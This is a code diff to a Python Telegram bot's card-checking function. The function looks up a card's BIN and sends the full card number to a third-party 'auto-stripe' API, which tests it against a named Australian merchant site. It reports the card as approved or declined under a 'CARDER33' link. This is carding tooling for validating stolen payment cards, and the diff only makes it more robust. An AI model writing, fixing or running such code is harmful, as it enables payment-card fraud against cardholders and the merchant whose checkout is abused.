@@ -1482,12 +1482,14 @@ import aiohttp
 import re
 from telegram.constants import ParseMode
 
-# Function to escape special characters for MarkdownV2
-def escape_md(text: str) -> str:
-    return re.sub(r'([_\*\[\]\(\)\~\>\#\+\-\=\|\{\}\.\!])', r'\\\1', text)
+# --- Safe escape for MarkdownV2 ---
+def escape_md(text: object) -> str:
+    """Escape text for MarkdownV2. Always coerce to str so None won't break re.sub."""
+    s = "" if text is None else str(text)
+    return re.sub(r'([_\*\[\]\(\)\~\>\#\+\-\=\|\{\}\.\!\\`])', r'\\\1', s)
+
 
 async def background_check(cc_normalized, parts, user, user_data, processing_msg):
-    # Prepare clickable bullet with square brackets visible
     bullet_text = "[⌇]"
     bullet_link_url = "https://t.me/CARDER33"  # replace with your actual link
     bullet_link = f"[{escape_md(bullet_text)}]({bullet_link_url})"
@@ -1495,28 +1497,40 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
     try:
         # BIN lookup
         bin_number = parts[0][:6]
-        bin_details = await get_bin_info(bin_number)
+        bin_details = await get_bin_info(bin_number) or {}
 
+        # Safely extract values
         brand = (bin_details.get("scheme") or "N/A").title()
-        issuer = bin_details.get("bank") or "N/A"
-        country_name = bin_details.get("country") or "N/A"
-        country_flag = bin_details.get("country_emoji", "")
-        card_type = bin_details.get("type", "N/A")
-        card_level = bin_details.get("brand", "N/A")
+        issuer = (
+            bin_details.get("bank", "N/A")["name"]
+            if isinstance(bin_details.get("bank"), dict)
+            else bin_details.get("bank") or "N/A"
+        )
+        country_name = (
+            bin_details.get("country", "N/A")["name"]
+            if isinstance(bin_details.get("country"), dict)
+            else bin_details.get("country") or "N/A"
+        )
+        country_flag = bin_details.get("country_emoji") or ""
+        card_type = bin_details.get("type") or "N/A"
+        card_level = bin_details.get("brand") or "N/A"
 
         # Call main API
-        api_url = f"https://darkboy-auto-stripe-y6qk.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+        api_url = (
+            "https://darkboy-auto-stripe-y6qk.onrender.com/"
+            f"gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
+        )
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=55) as resp:
                 if resp.status != 200:
                     raise Exception(f"HTTP {resp.status}")
                 data = await resp.json()
 
-        # Extract status + response from API
+        # Extract status + response
         api_status = (data.get("status") or "Unknown").strip()
         api_response = (data.get("response") or "No response").strip()
 
-        # Status formatting (with icons + bold style)
+        # Status formatting
         lower_status = api_status.lower()
         if "approved" in lower_status:
             status_text = "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 "
@@ -1541,13 +1555,16 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         else:
             status_text = f"ℹ️ {api_status.upper()}"
 
-        # Stylish box for status
+        # Stylish header
         header = f"◇━━〔 {escape_md(status_text)} 〕━━◇"
 
         # API response italic
         formatted_response = f"_{escape_md(api_response)}_"
 
-        # Build final message with [⌇] bullets
+        # Handle missing first_name
+        user_first = getattr(user, "first_name", None) or "User"
+
+        # Final text
         final_text = (
             f"{header}\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ `{escape_md(cc_normalized)}`\n"
@@ -1558,7 +1575,7 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
             f"{bullet_link} 𝐁𝐚𝐧𝐤 ➵ `{escape_md(issuer)}`\n"
             f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ `{escape_md(country_name)} {escape_md(country_flag)}`\n"
             f"――――――――――――――――\n"
-            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ [{escape_md(user.first_name)}](tg://user?id={user.id})\n"
+            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ [{escape_md(user_first)}](tg://user?id={user.id})\n"
             f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ [kคli liຖนxx](tg://resolve?domain=Kalinuxxx)\n"
             f"――――――――――――――――"
         )
@@ -1567,15 +1584,16 @@ async def background_check(cc_normalized, parts, user, user_data, processing_msg
         await processing_msg.edit_text(
             final_text,
             parse_mode=ParseMode.MARKDOWN_V2,
-            disable_web_page_preview=True
+            disable_web_page_preview=True,
         )
 
     except Exception as e:
         await processing_msg.edit_text(
             f"❌ An error occurred: {escape_md(str(e))}",
             parse_mode=ParseMode.MARKDOWN_V2,
-            disable_web_page_preview=True
+            disable_web_page_preview=True,
         )
+
 
 import re
 import asyncio
